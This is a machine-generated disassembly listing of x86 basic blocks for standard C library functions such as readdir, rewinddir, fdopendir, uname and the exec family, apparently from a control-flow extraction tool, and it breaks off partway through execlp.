0xb0b1362:	mov	dword ptr [esp + 0x20], esi
0xb0b1366:	add	esp, 0x14
0xb0b1369:	pop	ebx
0xb0b136a:	pop	esi
0xb0b136b:	jmp	0xb0db86a
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:readdir
TOTAL BLOCKS :22
0xb0b143f:	jne	0xb0b1469
None
|
|
|
v
0xb0b1471:	jmp	0xb0b1441
None
|
|
|
v
0xb0b143a:	lock sub	dword ptr [esi + 4], 1
None
|
|
|
v
0xb0b1390:	push	ebp
0xb0b1391:	mov	ebp, dword ptr gs:[0]
0xb0b1398:	mov	ecx, 1
0xb0b139d:	push	edi
0xb0b139e:	push	esi
0xb0b139f:	push	ebx
0xb0b13a0:	call	0xb1267db
None
|
|
|
v
0xb0b13cc:	lock cmpxchg	dword ptr [esi + 4], ecx
0xb0b13d1:	jne	0xb0b145c
None
|
|
|
v
0xb0b1464:	jmp	0xb0b13d7
None
|
|
|
v
0xb0b141a:	mov	eax, dword ptr [ebx - 0xdc]
0xb0b1420:	xor	edx, edx
0xb0b1422:	mov	edi, dword ptr [esp + 0xc]
0xb0b1426:	mov	dword ptr [ebp + eax], edi
0xb0b142a:	lea	esi, dword ptr [esi]
0xb0b1430:	cmp	dword ptr gs:[0xc], 0
0xb0b1438:	je	0xb0b143b
None
|
|
|
v
0xb0b13a5:	add	ebx, 0xf9c5b
0xb0b13ab:	sub	esp, 0x1c
0xb0b13ae:	mov	esi, dword ptr [esp + 0x30]
0xb0b13b2:	mov	eax, dword ptr [ebx - 0xdc]
0xb0b13b8:	mov	eax, dword ptr [ebp + eax]
0xb0b13bc:	mov	dword ptr [esp + 0xc], eax
0xb0b13c0:	xor	eax, eax
0xb0b13c2:	cmp	dword ptr gs:[0xc], 0
0xb0b13ca:	je	0xb0b13cd
None
|
|
|
v
0xb0b1430:	cmp	dword ptr gs:[0xc], 0
0xb0b1438:	je	0xb0b143b
None
|
|
|
v
0xb0b13d7:	mov	eax, dword ptr [esi + 0x10]
0xb0b13da:	lea	edi, dword ptr [esi + 0x1c]
0xb0b13dd:	jmp	0xb0b13f9
None
|
|
|
v
0xb0b145c:	lea	ecx, dword ptr [esi + 4]
0xb0b145f:	call	0xb0f9430
None
|
|
|
v
0xb0b1418:	jne	0xb0b144b
None
|
|
|
v
0xb0b13e4:	movzx	ecx, word ptr [edx + 8]
0xb0b13e8:	add	eax, ecx
0xb0b13ea:	mov	ecx, dword ptr [edx + 4]
0xb0b13ed:	mov	dword ptr [esi + 0x10], eax
0xb0b13f0:	mov	dword ptr [esi + 0x14], ecx
0xb0b13f3:	mov	ecx, dword ptr [edx]
0xb0b13f5:	test	ecx, ecx
0xb0b13f7:	jne	0xb0b1430
None
|
|
|
v
0xb0b1458:	xor	edx, edx
0xb0b145a:	jmp	0xb0b1430
None
|
|
|
v
0xb0b13fe:	mov	ecx, dword ptr [esi + 8]
0xb0b1401:	mov	edx, edi
0xb0b1403:	mov	eax, dword ptr [esi]
0xb0b1405:	call	0xb0b1770
None
|
|
|
v
0xb0b140a:	cmp	eax, 0
0xb0b140d:	jle	0xb0b1418
None
|
|
|
v
0xb0b13f9:	cmp	dword ptr [esi + 0xc], eax
0xb0b13fc:	ja	0xb0b13e0
None
|
|
|
v
0xb0b1469:	lea	eax, dword ptr [esi + 4]
0xb0b146c:	call	0xb0f9460
None
|
|
|
v
0xb0b13e0:	lea	edx, dword ptr [esi + eax + 0x1c]
0xb0b13e4:	movzx	ecx, word ptr [edx + 8]
0xb0b13e8:	add	eax, ecx
0xb0b13ea:	mov	ecx, dword ptr [edx + 4]
0xb0b13ed:	mov	dword ptr [esi + 0x10], eax
0xb0b13f0:	mov	dword ptr [esi + 0x14], ecx
0xb0b13f3:	mov	ecx, dword ptr [edx]
0xb0b13f5:	test	ecx, ecx
0xb0b13f7:	jne	0xb0b1430
None
|
|
|
v
0xb0b140f:	mov	dword ptr [esi + 0xc], eax
0xb0b1412:	mov	edx, edi
0xb0b1414:	xor	eax, eax
0xb0b1416:	jmp	0xb0b13e4
None
|
|
|
v
0xb0b1441:	add	esp, 0x1c
0xb0b1444:	mov	eax, edx
0xb0b1446:	pop	ebx
0xb0b1447:	pop	esi
0xb0b1448:	pop	edi
0xb0b1449:	pop	ebp
0xb0b144a:	ret	
None
|
|
|
v
0xb0b144b:	mov	eax, dword ptr [ebx - 0xdc]
0xb0b1451:	cmp	dword ptr [ebp + eax], 2
0xb0b1456:	je	0xb0b141a
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:rewinddir
TOTAL BLOCKS :11
0xb0b1600:	mov	dword ptr [esp + 8], 0
0xb0b1608:	mov	dword ptr [esp + 4], 0
0xb0b1610:	mov	eax, dword ptr [esi]
0xb0b1612:	mov	dword ptr [esp], eax
0xb0b1615:	call	0xb0db060
None
|
|
|
v
0xb0b15e0:	push	esi
0xb0b15e1:	xor	eax, eax
0xb0b15e3:	sub	esp, 0x18
0xb0b15e6:	mov	ecx, 1
0xb0b15eb:	mov	esi, dword ptr [esp + 0x20]
0xb0b15ef:	cmp	dword ptr gs:[0xc], 0
0xb0b15f7:	je	0xb0b15fa
None
|
|
|
v
0xb0b1654:	jmp	0xb0b1600
None
|
|
|
v
0xb0b165e:	jmp	0xb0b1647
None
|
|
|
v
0xb0b15f9:	lock cmpxchg	dword ptr [esi + 4], ecx
0xb0b15fe:	jne	0xb0b164c
None
|
|
|
v
0xb0b1647:	add	esp, 0x18
0xb0b164a:	pop	esi
0xb0b164b:	ret	
None
|
|
|
v
0xb0b1640:	lock sub	dword ptr [esi + 4], 1
None
|
|
|
v
0xb0b1656:	lea	eax, dword ptr [esi + 4]
0xb0b1659:	call	0xb0f9460
None
|
|
|
v
0xb0b161a:	mov	dword ptr [esi + 0x14], 0
0xb0b1621:	mov	dword ptr [esi + 0x10], 0
0xb0b1628:	mov	dword ptr [esi + 0xc], 0
0xb0b162f:	mov	dword ptr [esi + 0x18], 0
0xb0b1636:	cmp	dword ptr gs:[0xc], 0
0xb0b163e:	je	0xb0b1641
None
|
|
|
v
0xb0b1645:	jne	0xb0b1656
None
|
|
|
v
0xb0b164c:	lea	ecx, dword ptr [esi + 4]
0xb0b164f:	call	0xb0f9430
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0b1770
TOTAL BLOCKS :10
0xb0b1798:	xchg	ebx, edi
0xb0b179a:	cmp	eax, 0xfffff000
0xb0b179f:	ja	0xb0b17f7
None
|
|
|
v
0xb0b17f7:	neg	eax
0xb0b17f9:	mov	edx, dword ptr gs:[0]
0xb0b1800:	mov	edi, eax
0xb0b1802:	mov	eax, dword ptr [ebx - 0xdc]
0xb0b1808:	mov	dword ptr [esp + 0x1c], 0xffffffff
0xb0b1810:	mov	dword ptr [edx + eax], edi
0xb0b1813:	jmp	0xb0b17eb
None
|
|
|
v
0xb0b17b0:	movzx	eax, word ptr [esi + 8]
0xb0b17b4:	lea	ebp, dword ptr [esi + 0xa]
0xb0b17b7:	movzx	edi, byte ptr [esi + eax - 1]
0xb0b17bc:	mov	dword ptr [esp], ebp
0xb0b17bf:	call	0xb07ae80
None
|
|
|
v
0xb0b17a1:	mov	dword ptr [esp + 0x1c], eax
0xb0b17a5:	add	eax, esi
0xb0b17a7:	cmp	esi, eax
0xb0b17a9:	mov	dword ptr [esp + 0x18], eax
0xb0b17ad:	jae	0xb0b17eb
None
|
|
|
v
0xb0b17af:	nop	
None
|
|
|
v
0xb0b17c4:	mov	dword ptr [esp + 4], ebp
0xb0b17c8:	add	eax, 1
0xb0b17cb:	mov	dword ptr [esp + 8], eax
0xb0b17cf:	lea	eax, dword ptr [esi + 0xb]
0xb0b17d2:	mov	dword ptr [esp], eax
0xb0b17d5:	call	0xb07c960
None
|
|
|
v
0xb0b17da:	mov	eax, edi
0xb0b17dc:	mov	byte ptr [esi + 0xa], al
0xb0b17df:	movzx	eax, word ptr [esi + 8]
0xb0b17e3:	add	esi, eax
0xb0b17e5:	cmp	dword ptr [esp + 0x18], esi
0xb0b17e9:	ja	0xb0b17b0
None
|
|
|
v
0xb0b1770:	push	ebp
0xb0b1771:	push	edi
0xb0b1772:	mov	edi, eax
0xb0b1774:	push	esi
0xb0b1775:	mov	esi, edx
0xb0b1777:	push	ebx
0xb0b1778:	mov	edx, ecx
0xb0b177a:	sub	esp, 0x2c
0xb0b177d:	mov	ecx, esi
0xb0b177f:	call	0xb1267db
None
|
|
|
v
0xb0b1784:	add	ebx, 0xf987c
0xb0b178a:	xchg	edi, ebx
0xb0b178c:	mov	eax, 0x8d
0xb0b1791:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0b17eb:	mov	eax, dword ptr [esp + 0x1c]
0xb0b17ef:	add	esp, 0x2c
0xb0b17f2:	pop	ebx
0xb0b17f3:	pop	esi
0xb0b17f4:	pop	edi
0xb0b17f5:	pop	ebp
0xb0b17f6:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0b1870
TOTAL BLOCKS :18
0xb0b196c:	mov	edx, dword ptr [ebp - 0x3c]
0xb0b196f:	mov	ecx, dword ptr [ebp - 0x40]
0xb0b1972:	mov	eax, edx
0xb0b1974:	and	eax, ecx
0xb0b1976:	cmp	eax, 0xff
0xb0b1979:	je	0xb0b19d1
None
|
|
|
v
0xb0b1870:	push	ebp
0xb0b1871:	mov	ebp, esp
0xb0b1873:	push	edi
0xb0b1874:	push	esi
0xb0b1875:	mov	esi, edx
0xb0b1877:	push	ebx
0xb0b1878:	sub	esp, 0x4c
0xb0b187b:	call	0xb1267db
None
|
|
|
v
0xb0b19a8:	mov	eax, edi
0xb0b19aa:	sub	eax, dword ptr [ebp - 0x44]
0xb0b19ad:	lea	esp, dword ptr [ebp - 0xc]
0xb0b19b0:	pop	ebx
0xb0b19b1:	pop	esi
0xb0b19b2:	pop	edi
0xb0b19b3:	pop	ebp
0xb0b19b4:	ret	
None
|
|
|
v
0xb0b1880:	add	ebx, 0xf9780
0xb0b1886:	cmp	ecx, 0x110
0xb0b188c:	mov	dword ptr [ebp - 0x44], edx
0xb0b188f:	mov	edx, ecx
0xb0b1891:	mov	dword ptr [ebp - 0x48], eax
0xb0b1894:	jbe	0xb0b19b8
None
|
|
|
v
0xb0b1996:	mov	eax, edi
0xb0b1998:	sub	eax, dword ptr [ebp - 0x44]
0xb0b199b:	lea	esp, dword ptr [ebp - 0xc]
0xb0b199e:	pop	ebx
0xb0b199f:	pop	esi
0xb0b19a0:	pop	edi
0xb0b19a1:	pop	ebp
0xb0b19a2:	ret	
None
|
|
|
v
0xb0b19d1:	mov	eax, dword ptr [ebx - 0xdc]
0xb0b19d7:	mov	edx, dword ptr gs:[0]
0xb0b19de:	mov	dword ptr [edx + eax], 0x4b
0xb0b19e5:	mov	eax, 0xffffffff
0xb0b19ea:	jmp	0xb0b19ad
None
|
|
|
v
0xb0b18ca:	mov	dword ptr [ebp - 0x3c], 0xffffffff
0xb0b18d1:	mov	dword ptr [ebp - 0x40], 0xffffffff
0xb0b18d8:	jmp	0xb0b1906
None
|
|
|
v
0xb0b19ec:	mov	edx, dword ptr [ebx - 0xdc]
0xb0b19f2:	neg	eax
0xb0b19f4:	mov	ecx, dword ptr gs:[0]
0xb0b19fb:	mov	dword ptr [ecx + edx], eax
0xb0b19fe:	mov	eax, 0xffffffff
0xb0b1a03:	jmp	0xb0b19ad
None
|
|
|
v
0xb0b1906:	movzx	edx, word ptr [esi + 0x10]
0xb0b190a:	mov	ecx, dword ptr [esi + 8]
0xb0b190d:	lea	eax, dword ptr [edx - 1]
0xb0b1910:	and	eax, 0xfffffffc
0xb0b1913:	mov	dword ptr [ebp - 0x20], eax
0xb0b1916:	mov	eax, dword ptr [esi]
0xb0b1918:	mov	dword ptr [ebp - 0x30], ecx
0xb0b191b:	mov	dword ptr [ebp - 0x2c], edx
0xb0b191e:	mov	dword ptr [ebp - 0x24], eax
0xb0b1921:	mov	eax, dword ptr [esi + 4]
0xb0b1924:	mov	dword ptr [ebp - 0x28], eax
0xb0b1927:	mov	eax, dword ptr [esi + 0xc]
0xb0b192a:	mov	dword ptr [ebp - 0x1c], eax
0xb0b192d:	movzx	eax, byte ptr [esi + 0x12]
0xb0b1931:	mov	byte ptr [ebp - 0x31], al
0xb0b1934:	lea	eax, dword ptr [edx - 0x13]
0xb0b1937:	mov	dword ptr [esp + 8], eax
0xb0b193b:	lea	eax, dword ptr [esi + 0x13]
0xb0b193e:	mov	dword ptr [esp + 4], eax
0xb0b1942:	lea	eax, dword ptr [edi + 0xf]
0xb0b1945:	mov	dword ptr [esp], eax
0xb0b1948:	call	0xb07c960
None
|
|
|
v
0xb0b19b8:	lea	eax, dword ptr [ecx + 0x22]
0xb0b19bb:	add	edx, 4
0xb0b19be:	and	eax, 0xfffffff0
0xb0b19c1:	sub	esp, eax
0xb0b19c3:	lea	eax, dword ptr [esp + 0x1f]
0xb0b19c7:	and	eax, 0xfffffff0
0xb0b19ca:	mov	esi, eax
0xb0b19cc:	jmp	0xb0b189a
None
|
|
|
v
0xb0b18e0:	movzx	eax, word ptr [ebp - 0x20]
0xb0b18e4:	add	esi, edx
0xb0b18e6:	mov	word ptr [edi + 0xc], ax
0xb0b18ea:	movzx	eax, byte ptr [ebp - 0x31]
0xb0b18ee:	mov	byte ptr [edi + 0xe], al
0xb0b18f1:	add	edi, dword ptr [ebp - 0x20]
0xb0b18f4:	cmp	dword ptr [ebp - 0x38], esi
0xb0b18f7:	jbe	0xb0b19a8
None
|
|
|
v
0xb0b18fd:	mov	eax, dword ptr [ebp - 0x1c]
0xb0b1900:	mov	dword ptr [ebp - 0x3c], ecx
0xb0b1903:	mov	dword ptr [ebp - 0x40], eax
0xb0b1906:	movzx	edx, word ptr [esi + 0x10]
0xb0b190a:	mov	ecx, dword ptr [esi + 8]
0xb0b190d:	lea	eax, dword ptr [edx - 1]
0xb0b1910:	and	eax, 0xfffffffc
0xb0b1913:	mov	dword ptr [ebp - 0x20], eax
0xb0b1916:	mov	eax, dword ptr [esi]
0xb0b1918:	mov	dword ptr [ebp - 0x30], ecx
0xb0b191b:	mov	dword ptr [ebp - 0x2c], edx
0xb0b191e:	mov	dword ptr [ebp - 0x24], eax
0xb0b1921:	mov	eax, dword ptr [esi + 4]
0xb0b1924:	mov	dword ptr [ebp - 0x28], eax
0xb0b1927:	mov	eax, dword ptr [esi + 0xc]
0xb0b192a:	mov	dword ptr [ebp - 0x1c], eax
0xb0b192d:	movzx	eax, byte ptr [esi + 0x12]
0xb0b1931:	mov	byte ptr [ebp - 0x31], al
0xb0b1934:	lea	eax, dword ptr [edx - 0x13]
0xb0b1937:	mov	dword ptr [esp + 8], eax
0xb0b193b:	lea	eax, dword ptr [esi + 0x13]
0xb0b193e:	mov	dword ptr [esp + 4], eax
0xb0b1942:	lea	eax, dword ptr [edi + 0xf]
0xb0b1945:	mov	dword ptr [esp], eax
0xb0b1948:	call	0xb07c960
None
|
|
|
v
0xb0b19ad:	lea	esp, dword ptr [ebp - 0xc]
0xb0b19b0:	pop	ebx
0xb0b19b1:	pop	esi
0xb0b19b2:	pop	edi
0xb0b19b3:	pop	ebp
0xb0b19b4:	ret	
None
|
|
|
v
0xb0b18ba:	add	eax, esi
0xb0b18bc:	mov	edi, dword ptr [ebp - 0x44]
0xb0b18bf:	cmp	eax, esi
0xb0b18c1:	mov	dword ptr [ebp - 0x38], eax
0xb0b18c4:	jbe	0xb0b19a8
None
|
|
|
v
0xb0b194d:	mov	eax, dword ptr [ebp - 0x1c]
0xb0b1950:	mov	ecx, dword ptr [ebp - 0x24]
0xb0b1953:	mov	edx, dword ptr [ebp - 0x2c]
0xb0b1956:	mov	dword ptr [edi + 8], eax
0xb0b1959:	mov	eax, dword ptr [ebp - 0x28]
0xb0b195c:	mov	dword ptr [edi], ecx
0xb0b195e:	mov	ecx, dword ptr [ebp - 0x30]
0xb0b1961:	test	eax, eax
0xb0b1963:	mov	dword ptr [edi + 4], ecx
0xb0b1966:	je	0xb0b18e0
None
|
|
|
v
0xb0b189a:	mov	edi, dword ptr [ebp - 0x48]
0xb0b189d:	mov	ecx, esi
0xb0b189f:	xchg	edi, ebx
0xb0b18a1:	mov	eax, 0xdc
0xb0b18a6:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0b197b:	mov	eax, dword ptr [ebp - 0x48]
0xb0b197e:	mov	dword ptr [esp + 0xc], 0
0xb0b1986:	mov	dword ptr [esp + 4], edx
0xb0b198a:	mov	dword ptr [esp + 8], ecx
0xb0b198e:	mov	dword ptr [esp], eax
0xb0b1991:	call	0xb0ebff0
None
|
|
|
v
0xb0b18ad:	xchg	ebx, edi
0xb0b18af:	cmp	eax, 0xfffff000
0xb0b18b4:	ja	0xb0b19ec
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fdopendir
TOTAL BLOCKS :13
0xb0b1fae:	sub	esp, 4
0xb0b1fb1:	lea	esp, dword ptr [ebp - 0xc]
0xb0b1fb4:	pop	ebx
0xb0b1fb5:	pop	esi
0xb0b1fb6:	pop	edi
0xb0b1fb7:	pop	ebp
0xb0b1fb8:	ret	
None
|
|
|
v
0xb0b1f91:	cmp	eax, 0xff
0xb0b1f94:	je	0xb0b1fcd
None
|
|
|
v
0xb0b1fb1:	lea	esp, dword ptr [ebp - 0xc]
0xb0b1fb4:	pop	ebx
0xb0b1fb5:	pop	esi
0xb0b1fb6:	pop	edi
0xb0b1fb7:	pop	ebp
0xb0b1fb8:	ret	
None
|
|
|
v
0xb0b1f72:	mov	eax, dword ptr [ebp - 0x68]
0xb0b1f75:	and	eax, 0xf000
0xb0b1f7a:	cmp	eax, 0x4000
0xb0b1f7f:	jne	0xb0b1fb9
None
|
|
|
v
0xb0b1f6e:	test	eax, eax
0xb0b1f70:	js	0xb0b1fcd
None
|
|
|
v
0xb0b1fcd:	xor	eax, eax
0xb0b1fcf:	jmp	0xb0b1fb1
None
|
|
|
v
0xb0b1f4b:	add	ebx, 0xf90b5
0xb0b1f51:	sub	esp, 0x7c
0xb0b1f54:	mov	esi, dword ptr [ebp + 8]
0xb0b1f57:	lea	edi, dword ptr [ebp - 0x78]
0xb0b1f5a:	mov	dword ptr [esp + 8], edi
0xb0b1f5e:	mov	dword ptr [esp], 3
0xb0b1f65:	mov	dword ptr [esp + 4], esi
0xb0b1f69:	call	0xb0da2f0
None
|
|
|
v
0xb0b1fb9:	mov	eax, dword ptr [ebx - 0xdc]
0xb0b1fbf:	mov	edx, dword ptr gs:[0]
0xb0b1fc6:	mov	dword ptr [edx + eax], 0x14
0xb0b1fcd:	xor	eax, eax
0xb0b1fcf:	jmp	0xb0b1fb1
None
|
|
|
v
0xb0b1f40:	push	ebp
0xb0b1f41:	mov	ebp, esp
0xb0b1f43:	push	edi
0xb0b1f44:	push	esi
0xb0b1f45:	push	ebx
0xb0b1f46:	call	0xb1267db
None
|
|
|
v
0xb0b1fa0:	mov	ecx, eax
0xb0b1fa2:	xor	edx, edx
0xb0b1fa4:	mov	dword ptr [esp], edi
0xb0b1fa7:	mov	eax, esi
0xb0b1fa9:	call	0xb0b1170
None
|
|
|
v
0xb0b1f96:	mov	edx, eax
0xb0b1f98:	and	edx, 3
0xb0b1f9b:	cmp	edx, 1
0xb0b1f9e:	je	0xb0b1fd1
None
|
|
|
v
0xb0b1f81:	mov	dword ptr [esp + 4], 3
0xb0b1f89:	mov	dword ptr [esp], esi
0xb0b1f8c:	call	0xb0db490
None
|
|
|
v
0xb0b1fd1:	mov	eax, dword ptr [ebx - 0xdc]
0xb0b1fd7:	mov	edx, dword ptr gs:[0]
0xb0b1fde:	mov	dword ptr [edx + eax], 0x16
0xb0b1fe5:	xor	eax, eax
0xb0b1fe7:	jmp	0xb0b1fb1
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:uname
TOTAL BLOCKS :5
0xb0b553c:	call	0xb1267df
None
|
|
|
v
0xb0b5541:	add	ecx, 0xf5abf
0xb0b5547:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0b554d:	neg	eax
0xb0b554f:	add	ecx, dword ptr gs:[0]
0xb0b5556:	mov	dword ptr [ecx], eax
0xb0b5558:	or	eax, 0xffffffff
0xb0b555b:	ret	
None
|
|
|
v
0xb0b553b:	ret	
None
|
|
|
v
0xb0b5520:	mov	edx, ebx
0xb0b5522:	mov	ebx, dword ptr [esp + 4]
0xb0b5526:	mov	eax, 0x7a
0xb0b552b:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0b5532:	mov	ebx, edx
0xb0b5534:	cmp	eax, 0xfffff001
0xb0b5539:	jae	0xb0b553c
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_Exit
TOTAL BLOCKS :2
0xb0b5f34:	mov	eax, 1
0xb0b5f39:	int	0x80
None
|
|
|
v
0xb0b5f24:	mov	ebx, dword ptr [esp + 4]
0xb0b5f28:	mov	eax, 0xfc
0xb0b5f2d:	call	dword ptr gs:[0x10]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:execve
TOTAL BLOCKS :5
0xb0b5f73:	mov	edx, dword ptr [ebx - 0xdc]
0xb0b5f79:	neg	eax
0xb0b5f7b:	mov	ecx, dword ptr gs:[0]
0xb0b5f82:	mov	dword ptr [ecx + edx], eax
0xb0b5f85:	or	eax, 0xffffffff
0xb0b5f88:	jmp	0xb0b5f70
None
|
|
|
v
0xb0b5f40:	push	edi
0xb0b5f41:	push	ebx
0xb0b5f42:	mov	edx, dword ptr [esp + 0x14]
0xb0b5f46:	call	0xb1267db
None
|
|
|
v
0xb0b5f4b:	add	ebx, 0xf50b5
0xb0b5f51:	mov	ecx, dword ptr [esp + 0x10]
0xb0b5f55:	mov	edi, dword ptr [esp + 0xc]
0xb0b5f59:	xchg	edi, ebx
0xb0b5f5b:	mov	eax, 0xb
0xb0b5f60:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0b5f70:	pop	ebx
0xb0b5f71:	pop	edi
0xb0b5f72:	ret	
None
|
|
|
v
0xb0b5f67:	xchg	ebx, edi
0xb0b5f69:	cmp	eax, 0xfffff000
0xb0b5f6e:	ja	0xb0b5f73
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:execl
TOTAL BLOCKS :22
0xb0b6268:	add	edi, 4
0xb0b626b:	mov	ecx, dword ptr [edi - 4]
0xb0b626e:	lea	edx, dword ptr [esi*4]
0xb0b6275:	mov	dword ptr [ebp + esi*4], ecx
0xb0b6279:	add	esi, 1
0xb0b627c:	test	ecx, ecx
0xb0b627e:	je	0xb0b62b8
None
|
|
|
v
0xb0b62e9:	mov	eax, dword ptr [esp + 0x14]
0xb0b62ed:	add	esp, 0x102c
0xb0b62f3:	pop	ebx
0xb0b62f4:	pop	esi
0xb0b62f5:	pop	edi
0xb0b62f6:	pop	ebp
0xb0b62f7:	ret	
None
|
|
|
v
0xb0b6325:	mov	eax, 0xffffffff
0xb0b632a:	jmp	0xb0b62ed
None
|
|
|
v
0xb0b631b:	jmp	0xb0b62ed
None
|
|
|
v
0xb0b62ed:	add	esp, 0x102c
0xb0b62f3:	pop	ebx
0xb0b62f4:	pop	esi
0xb0b62f5:	pop	edi
0xb0b62f6:	pop	ebp
0xb0b62f7:	ret	
None
|
|
|
v
0xb0b631d:	mov	dword ptr [esp], ebp
0xb0b6320:	call	0xb017470
None
|
|
|
v
0xb0b62f8:	mov	eax, dword ptr [ebx - 0xbc]
0xb0b62fe:	mov	eax, dword ptr [eax]
0xb0b6300:	mov	dword ptr [esp + 8], eax
0xb0b6304:	lea	eax, dword ptr [esp + 0x20]
0xb0b6308:	mov	dword ptr [esp + 4], eax
0xb0b630c:	mov	eax, dword ptr [esp + 0x1040]
0xb0b6313:	mov	dword ptr [esp], eax
0xb0b6316:	call	0xb0b5f40
None
|
|
|
v
0xb0b6280:	cmp	eax, esi
0xb0b6282:	jne	0xb0b6268
None
|
|
|
v
0xb0b6330:	mov	dword ptr [esp + 4], eax
0xb0b6334:	mov	dword ptr [esp], 0
0xb0b633b:	mov	dword ptr [esp + 0x1c], ecx
0xb0b633f:	mov	dword ptr [esp + 0x18], edx
0xb0b6343:	call	0xb0173e0
None
|
|
|
v
0xb0b62b8:	mov	eax, dword ptr [ebx - 0xbc]
0xb0b62be:	mov	eax, dword ptr [eax]
0xb0b62c0:	mov	dword ptr [esp + 4], ebp
0xb0b62c4:	mov	dword ptr [esp + 8], eax
0xb0b62c8:	mov	eax, dword ptr [esp + 0x1040]
0xb0b62cf:	mov	dword ptr [esp], eax
0xb0b62d2:	call	0xb0b5f40
None
|
|
|
v
0xb0b6371:	mov	ecx, dword ptr [esp + 0x18]
0xb0b6375:	mov	eax, ecx
0xb0b6377:	jmp	0xb0b6268
None
|
|
|
v
0xb0b623d:	add	ebx, 0xf4dc3
0xb0b6243:	test	eax, eax
0xb0b6245:	mov	dword ptr [esp + 0x20], eax
0xb0b6249:	je	0xb0b62f8
None
|
|
|
v
0xb0b62a4:	test	eax, eax
0xb0b62a6:	je	0xb0b631d
None
|
|
|
v
0xb0b62a8:	mov	ecx, dword ptr [esp + 0x18]
0xb0b62ac:	mov	ebp, eax
0xb0b62ae:	mov	eax, ecx
0xb0b62b0:	jmp	0xb0b6268
None
|
|
|
v
0xb0b6284:	lea	ecx, dword ptr [eax + eax]
0xb0b6287:	shl	eax, 3
0xb0b628a:	cmp	ebp, dword ptr [esp + 0x14]
0xb0b628e:	je	0xb0b6330
None
|
|
|
v
0xb0b6220:	push	ebp
0xb0b6221:	push	edi
0xb0b6222:	push	esi
0xb0b6223:	push	ebx
0xb0b6224:	sub	esp, 0x102c
0xb0b622a:	mov	eax, dword ptr [esp + 0x1044]
0xb0b6231:	lea	edi, dword ptr [esp + 0x1048]
0xb0b6238:	call	0xb1267db
None
|
|
|
v
0xb0b6348:	mov	edx, dword ptr [esp + 0x18]
0xb0b634c:	mov	ecx, dword ptr [esp + 0x1c]
0xb0b6350:	test	eax, eax
0xb0b6352:	mov	ebp, eax
0xb0b6354:	je	0xb0b6325
None
|
|
|
v
0xb0b6356:	mov	eax, dword ptr [esp + 0x14]
0xb0b635a:	add	edx, 4
0xb0b635d:	mov	dword ptr [esp + 8], edx
0xb0b6361:	mov	dword ptr [esp], ebp
0xb0b6364:	mov	dword ptr [esp + 0x18], ecx
0xb0b6368:	mov	dword ptr [esp + 4], eax
0xb0b636c:	call	0xb07d0b0
None
|
|
|
v
0xb0b62dd:	mov	dword ptr [esp], ebp
0xb0b62e0:	mov	dword ptr [esp + 0x14], eax
0xb0b62e4:	call	0xb017470
None
|
|
|
v
0xb0b62d7:	cmp	ebp, dword ptr [esp + 0x14]
0xb0b62db:	je	0xb0b62ed
None
|
|
|
v
0xb0b624f:	lea	eax, dword ptr [esp + 0x20]
0xb0b6253:	mov	esi, 1
0xb0b6258:	mov	dword ptr [esp + 0x14], eax
0xb0b625c:	mov	ebp, eax
0xb0b625e:	mov	eax, 0x400
0xb0b6263:	nop	
0xb0b6264:	lea	esi, dword ptr [esi]
0xb0b6268:	add	edi, 4
0xb0b626b:	mov	ecx, dword ptr [edi - 4]
0xb0b626e:	lea	edx, dword ptr [esi*4]
0xb0b6275:	mov	dword ptr [ebp + esi*4], ecx
0xb0b6279:	add	esi, 1
0xb0b627c:	test	ecx, ecx
0xb0b627e:	je	0xb0b62b8
None
|
|
|
v
0xb0b6294:	mov	dword ptr [esp + 4], eax
0xb0b6298:	mov	dword ptr [esp], ebp
0xb0b629b:	mov	dword ptr [esp + 0x18], ecx
0xb0b629f:	call	0xb0173e0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:execvp
TOTAL BLOCKS :3
0xb0b6380:	push	ebx
0xb0b6381:	call	0xb1267db
None
|
|
|
v
0xb0b6386:	add	ebx, 0xf4c7a
0xb0b638c:	sub	esp, 0x18
0xb0b638f:	mov	eax, dword ptr [ebx - 0xbc]
0xb0b6395:	mov	eax, dword ptr [eax]
0xb0b6397:	mov	dword ptr [esp + 8], eax
0xb0b639b:	mov	eax, dword ptr [esp + 0x24]
0xb0b639f:	mov	dword ptr [esp + 4], eax
0xb0b63a3:	mov	eax, dword ptr [esp + 0x20]
0xb0b63a7:	mov	dword ptr [esp], eax
0xb0b63aa:	call	0xb0b6510
None
|
|
|
v
0xb0b63af:	add	esp, 0x18
0xb0b63b2:	pop	ebx
0xb0b63b3:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:execlp
TOTAL BLOCKS :22
0xb0b6458:	mov	eax, dword ptr [esp + 0x1040]
0xb0b645f:	mov	dword ptr [esp + 4], ebp
0xb0b6463:	mov	dword ptr [esp], eax
0xb0b6466:	call	0xb0b6380
None
|
|
|
v
0xb0b6481:	add	esp, 0x102c
0xb0b6487:	pop	ebx
0xb0b6488:	pop	esi
0xb0b6489:	pop	edi
0xb0b648a:	pop	ebp
0xb0b648b:	ret	
None
|
|
|
v
0xb0b6434:	mov	dword ptr [esp + 4], eax
0xb0b6438:	mov	dword ptr [esp], ebp
0xb0b643b:	mov	dword ptr [esp + 0x18], ecx
0xb0b643f:	call	0xb0173e0
None
|
|
|
v
0xb0b6408:	add	edi, 4
0xb0b640b:	mov	ecx, dword ptr [edi - 4]
0xb0b640e:	lea	edx, dword ptr [esi*4]
0xb0b6415:	mov	dword ptr [ebp + esi*4], ecx
0xb0b6419:	add	esi, 1
0xb0b641c:	test	ecx, ecx
0xb0b641e:	je	0xb0b6458
None
|
|
|
